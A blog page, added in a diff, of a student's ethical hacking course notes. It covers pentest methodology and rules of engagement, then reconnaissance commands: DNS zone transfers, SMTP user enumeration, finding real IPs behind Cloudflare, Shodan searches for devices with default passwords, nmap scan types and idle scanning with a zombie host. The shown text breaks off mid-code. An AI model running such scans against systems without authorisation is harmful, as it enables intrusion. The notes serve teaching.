@@ -1,0 +1,2640 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Ethical Hacking | wahba</title>
+<meta name="keywords" content="Notes, Undergraduate">
+<meta name="description" content="Notes on ethical hacking">
+<meta name="author" content="Wahba Kamaluddin">
+<link rel="canonical" href="http://localhost:1313/posts/notes/eh/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css" integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/notes/eh/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="wahba (Alt + H)">wahba</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Ethical Hacking
+    </h1>
+    <div class="post-meta"><span title='2024-08-18 00:00:00 +0000 UTC'>August 18, 2024</span>&nbsp;·&nbsp;31 min&nbsp;·&nbsp;Wahba Kamaluddin
+
+</div>
+  </header> 
+  <div class="post-content"><p>
+
+<p><details >
+  <summary markdown="span">Chapter 1: Introduction</summary>
+  <ul>
+<li>
+<p>Types of Hackers</p>
+<ul>
+<li>White hat
+<ul>
+<li>A security personal or security resarcher</li>
+<li>Employed by an org., permitted to attact an org. to find vuln, that an attacker might be able to exploit</li>
+</ul>
+</li>
+<li>Black hat
+<ul>
+<li>AKA cracker, referred to as a bad guy, who uses his/ her knowledge for negative purposes</li>
+<li>They are referred to by media as hackers</li>
+</ul>
+</li>
+<li>Gray hat
+<ul>
+<li>Intermideate between a white hat and a black hat hacker</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Categories of hacker</p>
+<ul>
+<li>Script kiddie
+<ul>
+<li>AKA skid</li>
+<li>Lacks of knowledge on how an explout works and relies upon using exploits that someone else created</li>
+<li>May able to compromise a target but cant debug or modify an exploit in case it doenst work</li>
+</ul>
+</li>
+<li>Elite hacker
+<ul>
+<li>AKA l33t or 1337</li>
+<li>Has deep knowledge on how an exploit works</li>
+<li>Abel to create exploits, but also modify codes that someone else wrote</li>
+<li>Someone with elist skills of hacking</li>
+</ul>
+</li>
+<li>Hacktivist
+<ul>
+<li>A gorup of hackers that hack into computer for a cause or purpose</li>
+<li>May be political gain, freedom of speech, human rights and so on</li>
+</ul>
+</li>
+<li>Ethical hacker
+<ul>
+<li>Hired and permitted by an org. to attack its systems for the purpose of identifying vuln., which an attacker might take advantage of.</li>
+<li>The sole difference between “hacking” and “ethical hacking” is the permission</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Important terminologies</p>
+<ul>
+<li>Assets
+<ul>
+<li>Data, device or other components related to information activities that should be protected from anyone besides authorized people</li>
+</ul>
+</li>
+<li>Vulnerability
+<ul>
+<li>Flaw or weakness inside asset that could be used to gain unauthorized access to it</li>
+</ul>
+</li>
+<li>Threat
+<ul>
+<li>A possible danger to the computer system</li>
+<li>A successfull exploitation of vuln. is a threat</li>
+</ul>
+</li>
+<li>Exploit
+<ul>
+<li>Takes advantage of vuln, in an asset to allow attacker to gain access to data</li>
+</ul>
+</li>
+<li>Risk
+<ul>
+<li>Impact resulting from the successfyl compromise of an asset</li>
+<li>Risk = Threat * Vuln. *Impact</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Maqasid Al-Syari’ah</p>
+<ul>
+<li>Classified into three by Imam AL-Ghazali:</li>
+<li>Daruriyyat (necessity)
+<ul>
+<li>The protection of Deen (faith)</li>
+<li>The protection of Nafs (life)</li>
+<li>The protection of ‘Aql (intellect)</li>
+<li>The protection of Nasl (progeny)</li>
+<li>The protection of Mal (wealth)</li>
+</ul>
+</li>
+<li>Hajiyyat (complementary)</li>
+<li>Tahsiniiyyat (luxury)</li>
+</ul>
+<p><img alt="Screenshot 2024-05-04 at 15.32.04.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-04_at_15.32.04.png"></p>
+</li>
+<li>
+<p>Cybersecurity maturity level</p>
+<p><img alt="Screenshot 2024-05-04 at 15.32.42.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-04_at_15.32.42.png"></p>
+</li>
+<li>
+<p>Penetration test</p>
+<ul>
+<li>A subclass of ethical hacking; comprises a set of methods and procedures aim at testing/ protecting an org.’s security, to find vuln. and check whether it is explooitable to gain access to an asset</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th>Vuln. Assessement</th>
+          <th>Pen. Test.</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>goal is to figure out all vulns. in an asset and document them accordingly</td>
+          <td>simulate as an attacker to see if we are able to exploit a vuln. and document the vulns. that were exploitable and the false-positive</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>Preengagement
+<ul>
+<li>
+<p>Before the pentest, discussion between client and pentester is needed for the legal req and Rules of Engagement (ROE)</p>
+</li>
+<li>
+<p>Rules of Engagement</p>
+<ul>
+<li>A proper “oermission to hack” and a “nondisclosure” agreement signed by both parties</li>
+<li>Requirements in ROE
+<ul>
+<li>Scope of the engagement, what part of the org. must be tested</li>
+<li>Duration</li>
+<li>Methodology used</li>
+<li>Goals</li>
+<li>Allowed/ disallowed techniques</li>
+<li>Liabilities, responsibilities</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Milestones</p>
+<p><img alt="Screenshot 2024-05-04 at 15.46.46.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-04_at_15.46.46.png"></p>
+<ul>
+<li>Setup milestones so that the project is delivered as per the dates sgiven in the ROEin</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Pentest methodologies
+<ul>
+<li>
+<p>OWASP</p>
+<ul>
+<li>Specifically designed to test a webb application</li>
+</ul>
+</li>
+<li>
+<p>Open-Source Security Testing Methodology Manual (OSSTMM)</p>
+<p><img alt="Screenshot 2024-05-04 at 15.47.27.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-04_at_15.47.27.png"></p>
+<ul>
+<li>Includes almost all steps involved in a pentest</li>
+<li>Concise yet it’s a cumberstone process, hard to implement in everyday life</li>
+</ul>
+</li>
+<li>
+<p>NIST</p>
+<p><img alt="Screenshot 2024-05-04 at 15.50.31.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-04_at_15.50.31.png"></p>
+<ul>
+<li>More comprehensive than OSSTMM</li>
+<li>4 Phases:
+<ul>
+<li>
+<p>Planning</p>
+<ul>
+<li>How the engagement is going to be performed</li>
+</ul>
+</li>
+<li>
+<p>Discovery</p>
+<ol>
+<li>Information gathering, network scanning, service identification, OS detection</li>
+<li>Vuln. assessment</li>
+</ol>
+</li>
+<li>
+<p>Attack</p>
+<p><img alt="Screenshot 2024-05-04 at 15.50.14.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-04_at_15.50.14.png"></p>
+<ul>
+<li>If along the way a new host is compromised, go back to discovery phaseuntil no targets are left</li>
+</ul>
+</li>
+<li>
+<p>Reporting</p>
+<ul>
+<li>Plan something, then report</li>
+<li>Attack a target, then report the result</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Categories of pentest
+<ul>
+<li>Included in the ROE</li>
+<li>Chosen based on what th eorg. want to test, and how it wan to be tested</li>
+<li>Black box
+<ul>
+<li>Little or no info on the target (DMZ (Demilitarized Zone - physical or logical subnetwork that contains and exposes an organization&rsquo;s external-facing services to an untrusted, usually larger, network such as the Internet), OS, server vesion, etc)</li>
+<li>Only IP address are provided</li>
+<li>Very common scenario as a pentester</li>
+</ul>
+</li>
+<li>White box
+<ul>
+<li>Almost all information is provided</li>
+<li>Network - what app is running, versions, OS, etc</li>
+<li>Web app - source code</li>
+<li>Common for internal/ onsite pentest, since org, are concerned about leakage of info</li>
+</ul>
+</li>
+<li>Gray box
+<ul>
+<li>Some info are provide, some are hidden</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Types of pentest
+<ul>
+<li>
+<p>Network</p>
+<ul>
+<li>Testing network environement, can be internal or external network</li>
+</ul>
+</li>
+<li>
+<p>Web app</p>
+<ul>
+<li>Vuln, to web app and its server</li>
+</ul>
+</li>
+<li>
+<p>Mobile app</p>
+</li>
+<li>
+<p>Soc Eng</p>
+<ul>
+<li>The org. asks to attack its user; phishng</li>
+</ul>
+</li>
+<li>
+<p>Physical pentest</p>
+<ul>
+<li>Test security controls such as locks and RFID mechanisms</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Report writing</p>
+<ul>
+<li>Undrerstand which audience will read the report</li>
+<li>Executive class
+<ul>
+<li>CEO, They have very tedious schedule, have less technical knowledge - only read a small portion of the report; executive summary, remeidiation report, etc</li>
+</ul>
+</li>
+<li>Management class
+<ul>
+<li>CISOs, CISSPs, they’re reponsible for implementing the security policy of the company</li>
+<li>They will be interested in readin gabout overall strengths, weakness, remediation report, vuln, assessment report, etc</li>
+</ul>
+</li>
+<li>Technical class
+<ul>
+<li>Security manager, developers</li>
+<li>Will read the report thoroughly, since they’re responsible for patching the weakness found and for making sure that the necessary patches are implemented</li>
+</ul>
+</li>
+</ul>
+<p><a href="/images/university-notes/EH/sample-penetration-testing-report.pdf">sample-penetration-testing-report.pdf</a></p>
+</li>
+</ul>
+
+</details></p>
+
+
+
+<p><details >
+  <summary markdown="span">Chapter 2: Information Gathering</summary>
+  <ul>
+<li>2 Main categories
+<ul>
+<li>Active
+<ul>
+<li>Directly engage with the target</li>
+<li>Gathering info on what ports are open, what services are running, waht OS they use</li>
+<li>Noisy, can be detected by IDS, IPS, firewalls, and generate a log</li>
+</ul>
+</li>
+<li>Passive
+<ul>
+<li>Not directly engage with target</li>
+<li>Use search engines, social media, etc</li>
+</ul>
+</li>
+<li>Tools
+<ul>
+<li>
+<p>Copying website locally/</p>
+<ul>
+<li>htttrack</li>
+<li>wget</li>
+<li>Website Ripper Copier</li>
+</ul>
+</li>
+<li>
+<p>Whois</p>
+</li>
+<li>
+<p>Finding other website hosted on the same server</p>
+<ul>
+<li>Yougetsignal.com</li>
+<li>ritx</li>
+</ul>
+</li>
+<li>
+<p>Tracing location</p>
+<ul>
+<li><a href="http://www.ip-adress.com/ip_tracer/yourip">http://www.ip-adress.com/ip_tracer/yourip</a></li>
+<li>Traceroute
+<ul>
+<li>ICMP (always blocked by firewall) <code>traceroute google.com</code></li>
+<li>TCP <code>tcptraceroute google.com</code></li>
+<li>UDP <code>udptraceroute google.com</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Mapping out a network</p>
+<ul>
+<li>NeoTrace</li>
+<li>Cheops-ng</li>
+</ul>
+</li>
+<li>
+<p>Enumerating the webserver</p>
+<ul>
+<li>Intercept response using burpsuite</li>
+<li>Acunetix</li>
+<li>WhatWeb</li>
+<li>Netcraft</li>
+</ul>
+</li>
+<li>
+<p>Google hacking parameters</p>
+<p><img alt="Screenshot 2024-05-04 at 21.52.48.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-04_at_21.52.48.png"></p>
+<ul>
+<li>Site: <a href="http://www.techlotips.com">www.techlotips.com</a> — return all pages indexed by Google</li>
+<li>Link: <a href="http://www.techlotips.com/">www.techlotips.com</a> — return all sites linked to it</li>
+<li>Site: <a href="https://www.techlotips.com">www.techlotips.com</a> Intitle:ftp users — return all pages from techlotips that contain “ftp uses”</li>
+<li>Site: <a href="http://www.techlotips.com/">www.techlotips.com</a> inurl:ceo names — return all URLs with the given keyword</li>
+<li>Site: <a href="https://www.msn.com">www.msn.com</a> filetype:pdf — return all site that have PDF</li>
+</ul>
+</li>
+<li>
+<p>List of google dorks</p>
+<ul>
+<li><a href="http://hackersforcharity.org/ghdb">http://hackersforcharity.org/ghdb</a></li>
+<li><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></li>
+</ul>
+</li>
+<li>
+<p>Xcode Exploit Scanner</p>
+<ul>
+<li>Use google dorks to scan for vuln. such as SQLI and XAA</li>
+</ul>
+</li>
+<li>
+<p>File analysis</p>
+<ul>
+<li>FOCA — analyzes file without download, capable of finding vulns. such as dir listing and DNS cache snooping</li>
+</ul>
+</li>
+<li>
+<p>Harvesting Email Lists</p>
+<ul>
+<li><a href="http://theHarvester.py">theHarvester.py</a> — tool in Backtrack (/pentest/enumeration/google/harvester)</li>
+</ul>
+</li>
+<li>
+<p>Gathering wordlist from a target website</p>
+<ul>
+<li>CEWL — tool in BackTrack (/pentest/passwords/cewl)</li>
+</ul>
+</li>
+<li>
+<p>Scanning for subdomain</p>
+<ul>
+<li>Site: <a href="http://msn.com">http://msn.com</a> -inurl:www — Finding site without www (usually subdomain doen’t have www)</li>
+<li>TheHarvester</li>
+<li>Fierce — BackTrack (/pentest/ enumeration/dns/fierce)</li>
+<li>Knock.py</li>
+<li>wolframalpha</li>
+</ul>
+</li>
+<li>
+<p>DNS enumeration</p>
+<ul>
+<li>Nslookup
+<ul>
+<li><code>./fierce.pl –dns rafayhackingarticles.net wordlist.txt</code> — forward DNS lookup</li>
+<li><code>./fierce.pl –range &lt;networkrange&gt; -dnsserver &lt;server&gt;</code> — reverse DNS lookup</li>
+</ul>
+</li>
+<li>DIG
+<ul>
+<li><code>dig Wikipedia.org mx</code> — return mx records on wikipedia</li>
+<li><code>dig 201.152.80.208.in-addr.arpa PTR</code>  — reverse dns lookup</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Zone transfer (Replication of DNS record</p>
+<ul>
+<li><code>host –t ns [zonetransfer.me](http://zonetransfer.me/)</code> — father list of all same servers associated</li>
+<li><code>host –l zonetransfer.me ns12.zoneedit.com</code> — list all subdomains</li>
+<li><code>./dnsenum.pl [zonetransfer.me](http://zonetransfer.me)</code> — Automation of zone transfer on BackTrack (/pentest/ enumeration/dns/dnsenum)</li>
+</ul>
+</li>
+<li>
+<p>DNS cache snooping</p>
+<ul>
+<li>Querying DNS server to determine if it has a resource that is cached; to determine what websites a user has recently visited</li>
+<li>Nonrecursive
+<ol>
+<li>Ask DNS cache for any given resource record</li>
+<li>Set the “Recursion Desired” to 0; QUery the system and check its DNS cache for the particular record</li>
+<li>If there’s answer, means someone has visited it and vice-versa</li>
+</ol>
+<ul>
+<li><code>dig @ns1.toltbbs.com [rafayhackingarticles.net](http://rafayhackingarticles.net/) A +norecurse</code></li>
+</ul>
+</li>
+<li>Recursive
+<ol>
+<li>Ask DNS cache for any given resource record</li>
+<li>Set the “Recursion Desired” to recursive</li>
+<li>Examine the TTL field, if TTL in the answer &lt; inital set TTL field, the record is likely cached</li>
+<li>If record is not present in cache, it will present after the first query is made</li>
+</ol>
+<ul>
+<li><code>dig @ns1.toltbbs.com [rafayhackingarticles.net](http://rafayhackingarticles.net/) A +recurse</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>SNMP</p>
+<ul>
+<li>onesixtyone</li>
+<li>snmpenum</li>
+<li>solawwinds toolset</li>
+<li>SNMP sweep</li>
+</ul>
+</li>
+<li>
+<p>SMTP</p>
+<ul>
+<li><code>./smtp-user.enum.pl –M VRFY –u/pass.txt –t mailserver</code> — Backtrack ( /pentest/ enumeration/smtp); finding out valid smtp usernames</li>
+</ul>
+</li>
+<li>
+<p>Detecting load balancer</p>
+<ul>
+<li>Load balancer is a method used to distribute load upon other servers</li>
+<li>2 categories
+<ol>
+<li>Layer 4 load balancer/ DNS load balancer</li>
+<li>Layer 7 load balancer/ http load balancer</li>
+</ol>
+</li>
+<li><code>dig [googlle.com](http://googlle.com)</code> — if more htan 1 ip address, means it uses load balancer</li>
+<li><code>cd/pentest/enumeration/web/lbd</code>, <code>./lbd.sh www.google.com</code>&ndash;BackTrack script to detect load balancer</li>
+<li>Halberd — to detect real IP address behind load balancer</li>
+</ul>
+</li>
+<li>
+<p>Bypassing cloudfare protection</p>
+<ul>
+<li>
+<p>Developed to protect from DOS; Acting as reverse proxy, name and real IP address are hidden under CloudFare IP address, all traffic would be routed through CLoudFare servers</p>
+</li>
+<li>
+<p>Method 1: Resolvers</p>
+<ul>
+<li>search at <a href="http://www.cloudflare-watch.org/cfs.html">http://www.cloudflare-watch.org/cfs.html</a></li>
+</ul>
+</li>
+<li>
+<p>Method 2: Subdomain trick</p>
+<p><img alt="Screenshot 2024-05-05 at 11.00.30.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_11.00.30.png"></p>
+<ul>
+<li>Most people don’t configure CloudFare properly, only the main domain have a CloudFare IP but the subdomain point to real IP address</li>
+<li><a href="http://www.cloudflare-watch.org/cfs.html">http://www.cloudflare-watch.org/cfs.html</a></li>
+</ul>
+</li>
+<li>
+<p>Method 3: Mail servers</p>
+<ul>
+<li>Cloudfare  doesn’t handle mx record, so ever email sent to you is direclty form the real IP address</li>
+<li>use <a href="http://www.ip2location.com/free/email-tracer">http://www.ip2location.com/free/email-tracer</a> to track the origin of the email</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Intel gathering using shodan</p>
+<ul>
+<li>
+<p>Finding default password</p>
+<p><img alt="search routers with default password" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_11.05.07.png"></p>
+<p>search routers with default password</p>
+</li>
+<li>
+<p>Finding Cisco IOS requiring no authentication</p>
+<p>The Cisco IOS that has a “200 OK” response with the “Last-Modified” header does not require authentication. We can use the filter “cisco-ios” “last-modified” to search for all the Cisco devices requiring no authentication. The Shodan HQ currently has more than 13,000 results, meaning that more than 13,000 Cisco IOS devices do not require authentication</p>
+<p><img alt="Screenshot 2024-05-05 at 11.06.28.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_11.06.28.png"></p>
+</li>
+<li>
+<p>Default passwords</p>
+<p><img alt="Screenshot 2024-05-05 at 11.45.28.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_11.45.28.png"></p>
+<ul>
+<li>“default password”</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+</details></p>
+
+
+
+<p><details >
+  <summary markdown="span">Chapter 3: Target enumeration</summary>
+  <ul>
+<li>
+<p>Host discovery</p>
+<ul>
+<li>
+<p>Find out what targets are alive</p>
+</li>
+<li>
+<p>Nmap</p>
+<ul>
+<li><code>nmap –sP 192.168.15.1/24</code> — scan from …1 - …255 using TCP SYN on port 80 and 443; usually ICMP are blocked by firewall</li>
+</ul>
+</li>
+<li>
+<p>nping</p>
+<p><img alt="Screenshot 2024-05-05 at 12.10.51.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.10.51.png"></p>
+<ul>
+<li><code>nping --tcp didx.net</code></li>
+<li><code>nping --udp didx.net</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Scanning for open ports using Nmap</p>
+<ul>
+<li>Discovering TCP and UDP ports as an entrypoint</li>
+<li>Port status types
+<ul>
+<li><em>Open</em>—It means that the port is accessible and an application is listening on it</li>
+<li><em>Closed</em>—It means that the port is inaccessible and no application is listening on it.</li>
+<li><em>Filtered</em>—It means that nmap is not able to figure out if the port is open or closed, as the packets are being filtered, which probably means that the machine is behind a firewall.</li>
+<li><em>Unfiltered</em>—It means that the ports are accessible by nmap but it is not possible to figure out if they are open or closed.</li>
+</ul>
+</li>
+<li>Type of scan
+<ul>
+<li>
+<p>TCP SYN</p>
+<p><img alt="SYN → SYN/ACK → RST" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.29.23.png"></p>
+<p>SYN → SYN/ACK → RST</p>
+<p><img alt="Screenshot 2024-05-05 at 12.28.10.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.28.10.png"></p>
+<ul>
+<li><code>nmap –sS &lt;target IP&gt;</code></li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th>Positive</th>
+          <th>Negative</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Fast</td>
+          <td>Detectable by IDS, IPS, firewalls</td>
+      </tr>
+  </tbody>
+</table>
+</li>
+<li>
+<p>TCP connect</p>
+<p><img alt="Screenshot 2024-05-05 at 12.30.12.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.30.12.png"></p>
+<ul>
+<li>It completes the three-way handshake</li>
+<li>A default option if SYN scan isn’t supported by the machine (not allowed to create RAW packet)</li>
+</ul>
+<p><img alt="Screenshot 2024-05-05 at 12.31.41.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.31.41.png"></p>
+<ul>
+<li><code>nmap -sC</code></li>
+</ul>
+</li>
+<li>
+<p>NULL, FIN, XMAS</p>
+<ul>
+<li>
+<p>Advantage: Can get pass firewalls and IDS, beneficial against Unic-based OS, but not windows-based (since they send a reset packer regardless the port is open or closed</p>
+</li>
+<li>
+<p>Disadvantage: Can’t exactly determine if the port is open/ filtered, we need to test it manually</p>
+</li>
+<li>
+<p>NULL scan</p>
+<p><img alt="Screenshot 2024-05-05 at 12.35.03.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.35.03.png"></p>
+<ul>
+<li><code>nmap –sN &lt;target Ip Address&gt;</code></li>
+<li>Sending no flags/bits inside the TCP header</li>
+<li>If no response: port is open</li>
+<li>Respond with RST: port is closed or filtered</li>
+</ul>
+</li>
+<li>
+<p>FIN scan</p>
+<p><img alt="Screenshot 2024-05-05 at 12.36.36.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.36.36.png"></p>
+<ul>
+<li><code>nmap –sF &lt;target Ip Address&gt;</code></li>
+<li>FIN flag is used to close a currently open session</li>
+<li>If no response: port is open</li>
+<li>RST: port is closed</li>
+</ul>
+</li>
+<li>
+<p>XMAS scan</p>
+<p><img alt="Screenshot 2024-05-05 at 12.42.51.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.42.51.png"></p>
+<ul>
+<li><code>nmap –sX &lt;target Ip Address&gt;</code></li>
+<li>FIN, URG, PUSH</li>
+<li>If no response: port is open</li>
+<li>RST: port is closed</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>TCP ACK scan</p>
+<p><img alt="Screenshot 2024-05-05 at 12.45.54.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.45.54.png"></p>
+<p><img alt="Screenshot 2024-05-05 at 12.48.39.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.48.39.png"></p>
+<p><img alt="Screenshot 2024-05-05 at 12.48.48.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.48.48.png"></p>
+<ul>
+<li><code>nmap –sA &lt;target Ip Address&gt;</code></li>
+<li>Not for port scanning, but to determine firewall and ACL rules  (access list), whether they keep track of the connections being made</li>
+<li>We send ACK packet
+<ul>
+<li>If the firewall is stateful: they know no SYN packet sent, so it drop the packet</li>
+<li>If we get the RST packet, it means our packet is not dropped</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>UDP port scan</p>
+<p><img alt="Screenshot 2024-05-05 at 12.52.06.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_12.52.06.png"></p>
+<ul>
+<li><code>nmap –sU &lt;target Ip Address&gt;</code></li>
+<li>send empty UDP packet
+<ul>
+<li>got response: port is open</li>
+<li>no response: port is closed or filtered (based on ICMP error messages, if
+“ICMP Port unreachable error,, port is closed, else port is filtered</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Anonymous scan
+<ul>
+<li>IDLE scan
+<ul>
+<li>
+<p>Introduce a bot to scan another host, so our true identity is not known.</p>
+</li>
+<li>
+<p>Prerequisites:</p>
+<ol>
+<li>Finding a good candidate whose IP ID sequence is incremental and recording its IP ID</li>
+<li>The host should be IDLE on the network</li>
+</ol>
+</li>
+<li>
+<p>Scanning for vulnerable host</p>
+<ul>
+<li>
+<p>Hping2</p>
+<ul>
+<li>
+<p><code>hping2 –S –r &lt;Target IP&gt;</code> — S: SYN flag, R: relative id</p>
+<p><img alt="Screenshot 2024-05-05 at 15.25.55.png" loading="lazy" src="/images/university-notes/EH/Screenshot_2024-05-05_at_15.25.55.png"></p>
+<ul>
+<li>The id is incremented by 1, hence it’s a potential candidate for a zombie</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Metasploit</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">msf</span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">ip</span><span class="o">/</span><span class="n">ipidseq</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Set</span><span class="w"> </span><span class="n">RHOSTS</span><span class="w"> </span><span class="o">&lt;</span><span class="n">Target</span><span class="w"> </span><span class="n">Ip</span><span class="o">&gt;</span><span class="w">  </span><span class="err">##</span><span class="n">single</span><span class="w"> </span><span class="n">host</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
